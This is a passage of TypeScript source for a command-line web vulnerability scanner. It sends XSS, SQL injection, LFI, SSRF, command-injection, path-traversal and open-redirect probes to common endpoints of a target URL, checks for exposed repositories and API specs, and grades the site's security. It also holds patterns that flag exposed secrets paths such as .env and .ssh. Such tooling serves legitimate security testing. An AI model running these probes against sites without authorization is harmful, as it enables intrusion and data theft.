    { path: "/actuator/configprops", pattern: /(?:beans|properties)/i, desc: "Spring Boot config exposed" },
    { path: "/api/swagger.json", pattern: /(?:swagger|paths|info)/i, desc: "Swagger API spec exposed" },
    { path: "/api/openapi.json", pattern: /(?:openapi|paths|info)/i, desc: "OpenAPI spec exposed" },
    { path: "/.svn/entries", pattern: /svn/i, desc: "SVN entries exposed" },
    { path: "/.hg/store", pattern: /(?:changelog|manifest)/i, desc: "Mercurial repo exposed" },
    { path: "/crossdomain.xml", pattern: /allow-access-from/i, desc: "Permissive crossdomain policy" },
    { path: "/clientaccesspolicy.xml", pattern: /allow-from/i, desc: "Permissive Silverlight policy" },
  ];

  for (const il of infoLeakPaths) {
    try {
      const res = await axios.get(baseUrl + il.path, {
        timeout: 5000,
        validateStatus: () => true,
        httpsAgent: agent,
      });
      if (res.status === 200) {
        const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
        if (il.pattern.test(body)) {
          results.push({
            type: "InfoLeak",
            url: baseUrl + il.path,
            payload: "GET",
            evidence: il.desc,
            severity: "high",
            confidence: 90,
          });
          logSilent("FIND", `InfoLeak: ${baseUrl + il.path}`);
        }
      }
    } catch {}
  }

  return results;
}

export async function scanVulnerabilities(url: string): Promise<VulnResult[]> {
  const normalizedUrl = normalizeUrl(url);
  const allResults: VulnResult[] = [];

  const parsedUrl = new URL(normalizedUrl);
  const baseUrl = `${parsedUrl.protocol}//${parsedUrl.host}`;

  const testEndpoints = [
    { path: "/", params: ["q", "search", "query", "id", "page", "user", "file", "url", "cmd"] },
    { path: "/search", params: ["q", "query", "search", "term", "keyword"] },
    { path: "/api/search", params: ["q", "query", "search"] },
    { path: "/login", params: ["username", "email", "user", "password"] },
    { path: "/api/user", params: ["id", "user_id", "uid"] },
    { path: "/api/v1/users", params: ["id", "limit", "offset", "sort"] },
    { path: "/api/v2/data", params: ["id", "filter", "query"] },
    { path: "/index.php", params: ["id", "page", "cat", "file", "module", "action"] },
    { path: "/page", params: ["id", "p", "page", "view", "doc"] },
    { path: "/download", params: ["file", "path", "name", "doc"] },
    { path: "/view", params: ["file", "doc", "page", "id"] },
    { path: "/api/items", params: ["id", "q", "search", "filter"] },
    { path: "/profile", params: ["id", "user", "uid"] },
    { path: "/comment", params: ["id", "text", "content"] },
    { path: "/post", params: ["id", "slug", "page"] },
  ];

  const totalPhases = 8;
  let currentPhase = 0;

  const spinner = ora(chalk.cyan(`Vulnerability scanning phase ${currentPhase}/${totalPhases}...`)).start();

  currentPhase++;
  spinner.text = chalk.cyan(`[1/${totalPhases}] Testing XSS...`);
  const xss = await testXSS(baseUrl, testEndpoints);
  allResults.push(...xss);

  currentPhase++;
  spinner.text = chalk.cyan(`[2/${totalPhases}] Testing SQL Injection...`);
  const sqli = await testSQLi(baseUrl, testEndpoints);
  allResults.push(...sqli);

  currentPhase++;
  spinner.text = chalk.cyan(`[3/${totalPhases}] Testing LFI...`);
  const lfi = await testLFI(baseUrl);
  allResults.push(...lfi);

  currentPhase++;
  spinner.text = chalk.cyan(`[4/${totalPhases}] Testing SSRF...`);
  const ssrf = await testSSRF(baseUrl);
  allResults.push(...ssrf);

  currentPhase++;
  spinner.text = chalk.cyan(`[5/${totalPhases}] Testing Command Injection...`);
  const cmdi = await testCMDi(baseUrl);
  allResults.push(...cmdi);

  currentPhase++;
  spinner.text = chalk.cyan(`[6/${totalPhases}] Testing Path Traversal...`);
  const pt = await testPathTraversal(baseUrl);
  allResults.push(...pt);

  currentPhase++;
  spinner.text = chalk.cyan(`[7/${totalPhases}] Testing Open Redirect...`);
  const or = await testOpenRedirect(baseUrl);
  allResults.push(...or);

  currentPhase++;
  spinner.text = chalk.cyan(`[8/${totalPhases}] Testing Information Leaks...`);
  const info = await testInfoLeak(baseUrl);
  allResults.push(...info);

  spinner.stop();
  return allResults;
}

export function calculateRating(
  headers: HeaderScanResult[],
  vulns: VulnResult[],
  dirs: DirScanResult[],
  availability: AvailabilityResult
): SecurityRating {
  let score = 100;

  const missingHeaders = headers.filter((h) => !h.present);
  for (const h of missingHeaders) {
    if (h.severity === "critical") score -= 10;
    else if (h.severity === "warning") score -= 5;
    else score -= 2;
  }

  for (const v of vulns) {
    if (v.severity === "critical") score -= 25;
    else if (v.severity === "high") score -= 15;
    else if (v.severity === "medium") score -= 8;
    else score -= 3;
  }

  const exposedDirs = dirs.filter((d) => d.found);
  const sensitiveExposed = exposedDirs.filter((d) =>
    /admin|\.env|\.git|backup|dump|phpmyadmin|phpinfo|config|\.ht|WEB-INF|debug|console|\.ssh|\.svn|\.hg|log|composer|package/i.test(d.path)
  );
  score -= sensitiveExposed.length * 10;

  if (!availability.sslValid) score -= 15;
  if (!availability.dnsResolved) score -= 5;
  if (availability.serverHeader) score -= 2;
  if (availability.wafDetected) score += 5;
  if (availability.techStack.length > 0) score -= 1;

  score = Math.max(0, Math.min(100, score));

  let grade: string;
  let color: chalk.Chalk;
  let summary: string;

  if (score >= 90) { grade = "A"; color = chalk.green; summary = "Excellent security posture"; }
  else if (score >= 75) { grade = "B"; color = chalk.cyan; summary = "Good security, minor issues found"; }
  else if (score >= 60) { grade = "C"; color = chalk.yellow; summary = "Moderate security, improvements needed"; }
  else if (score >= 40) { grade = "D"; color = chalk.keyword("orange"); summary = "Poor security, significant vulnerabilities"; }
  else { grade = "F"; color = chalk.red; summary = "Critical security issues, immediate action required"; }

  return { score, grade, color, summary };
}

export function printAvailabilityTable(result: AvailabilityResult): void {
  const table = new Table({
    head: [chalk.cyan("Property"), chalk.cyan("Value")],
    style: { head: [], border: ["cyan"] },
  });

  const statusColor = result.isUp ? chalk.green : chalk.red;
  const sslColor = result.sslValid ? chalk.green : chalk.red;
  const dnsColor = result.dnsResolved ? chalk.green : chalk.red;

  table.push(
    ["URL", chalk.white(result.url)],
    ["Status", statusColor(result.isUp ? "UP" : "DOWN")],
    ["HTTP Code", result.statusCode ? String(result.statusCode) : "N/A"],
    ["Response Time", `${result.responseTime}ms`],
    ["SSL Valid", sslColor(result.sslValid ? "Yes" : "No")],
    ["DNS Resolved", dnsColor(result.dnsResolved ? "Yes" : "No")],
    ["Redirect", result.redirectUrl || "None"],
    ["Server", result.serverHeader || "Unknown"],
    ["Tech Stack", result.techStack.length > 0 ? result.techStack.map((t) => chalk.cyan(t)).join(", ") : "Unknown"],
    ["WAF", result.wafDetected ? chalk.red.bold(result.wafName || "Yes") : chalk.green("Not detected")],
  );

  console.log(table.toString());
}

export function printDirectoriesTable(results: DirScanResult[]): void {
  const found = results.filter((r) => r.found);
  if (found.length === 0) {
    console.log(chalk.yellow("  No accessible paths found"));
    return;
  }

  const table = new Table({
    head: [chalk.magenta("Path"), chalk.magenta("Status"), chalk.magenta("Size")],
    style: { head: [], border: ["magenta"] },
  });

  for (const r of found) {
    const statusColor = r.statusCode < 300 ? chalk.green : r.statusCode < 400 ? chalk.yellow : chalk.red;
    const isSensitive = /admin|\.env|\.git|backup|dump|phpmyadmin|phpinfo|config|\.ht|WEB-INF|debug|console|\.ssh|\.svn|\.hg|log|composer|package|upload/i.test(r.path);
    const pathStr = isSensitive ? chalk.red.bold(r.path) + chalk.red(" [RISK]") : chalk.white(r.path);
    table.push([pathStr, statusColor(String(r.statusCode)), r.size ? `${r.size}B` : "N/A"]);
  }

  console.log(table.toString());
}

export function printHeadersTable(results: HeaderScanResult[]): void {
  const table = new Table({
    head: [chalk.yellow("Header"), chalk.yellow("Status"), chalk.yellow("Value")],
    style: { head: [], border: ["yellow"] },
  });

  for (const h of results) {
    const statusStr = h.present ? chalk.green("Present") : chalk.red("Missing");
    const severityIcon = h.severity === "critical" ? chalk.red("!!") : h.severity === "warning" ? chalk.yellow("! ") : chalk.gray("   ");
    table.push([severityIcon + " " + h.header, statusStr, h.value || chalk.gray("-")]);
  }

  console.log(table.toString());
}

export function printVulnsTable(results: VulnResult[]): void {
  if (results.length === 0) {
    console.log(chalk.green("  No vulnerabilities found!"));
    return;
  }

  const deduped = new Map<string, VulnResult>();
  for (const v of results) {
    const key = `${v.type}:${v.payload}:${v.url}`;
    if (!deduped.has(key) || deduped.get(key)!.confidence < v.confidence) {
      deduped.set(key, v);
    }
  }

  const unique = [...deduped.values()];

  const table = new Table({
    head: [chalk.red("Type"), chalk.red("Sev"), chalk.red("Conf"), chalk.red("URL"), chalk.red("Payload")],
    style: { head: [], border: ["red"] },
    colWidths: [12, 8, 7, 40, 28],
  });

  const typeColors: Record<string, chalk.Chalk> = {
    "SQLi": chalk.red,
    "XSS": chalk.magenta,
    "LFI": chalk.keyword("orange"),
    "SSRF": chalk.yellow,
    "CMDi": chalk.red.bold,
    "PathTraversal": chalk.keyword("orange"),
    "OpenRedirect": chalk.yellow,
    "InfoLeak": chalk.blue,
    "AuthBypass": chalk.red,
    "WAF": chalk.gray,
  };

  for (const v of unique) {
    const sevColor = v.severity === "critical" ? chalk.red.bold : v.severity === "high" ? chalk.keyword("orange") : v.severity === "medium" ? chalk.yellow : chalk.gray;
    const tc = typeColors[v.type] || chalk.white;
    table.push([
      tc(v.type),
      sevColor(v.severity.substring(0, 4).toUpperCase()),
      chalk.white(`${v.confidence}%`),
      chalk.white(v.url.substring(0, 38)),
      chalk.gray(v.payload.substring(0, 26)),
    ]);
  }

  console.log(table.toString());
}

export function printRating(rating: SecurityRating): void {
  const box = [
    "",
    `  Score: ${rating.color.bold(String(rating.score))}/100`,
    `  Grade: ${rating.color.bold(rating.grade)}`,
    `  ${chalk.gray(rating.summary)}`,
    "",
  ].join("\n");

  const borderColor = rating.grade === "A" ? "green" : rating.grade === "B" ? "cyan" : rating.grade === "C" ? "yellow" : rating.grade === "D" ? "yellow" : "red";

  console.log(
    require("boxen")(chalk.bold("  Security Rating  ") + box, {
      padding: 0,
      borderStyle: "round",
      borderColor: borderColor as any,
      margin: { top: 1, bottom: 0, left: 0, right: 0 },
    })
  );
}

export async function fullScan(url: string): Promise<FullScanResult> {
  log("INFO", `Starting full scan of ${chalk.cyan(url)}`);

  const availability = await checkAvailability(url);
  printAvailabilityTable(availability);

  if (!availability.isUp) {
    log("ERROR", "Site is down, skipping further scans");
    const rating = calculateRating([], [], [], availability);
    printRating(rating);
    return { availability, directories: [], headers: [], vulnerabilities: [], rating };
  }

  const directories = await scanDirectories(url);
  log("INFO", `Found ${chalk.yellow(String(directories.filter((d) => d.found).length))} accessible paths`);
  printDirectoriesTable(directories);

  const headers = await scanHeaders(url);
  const missing = headers.filter((h) => !h.present);
  log("INFO", `${chalk.yellow(String(missing.length))} security headers missing`);
  printHeadersTable(headers);

  const vulnerabilities = await scanVulnerabilities(url);
  log("INFO", `Found ${chalk.red(String(vulnerabilities.length))} potential vulnerabilities`);
  printVulnsTable(vulnerabilities);

  const rating = calculateRating(headers, vulnerabilities, directories, availability);
  printRating(rating);

  log("INFO", `Scan complete. Security grade: ${rating.color.bold(rating.grade)} (${rating.score}/100)`);

  return { availability, directories, headers, vulnerabilities, rating };
}

export { normalizeUrl, COMMON_PATHS, XSS_PAYLOADS, SQLI_PAYLOADS, LFI_PAYLOADS, SSRF_PAYLOADS, CMDI_PAYLOADS, PATH_TRAVERSAL_PAYLOADS };
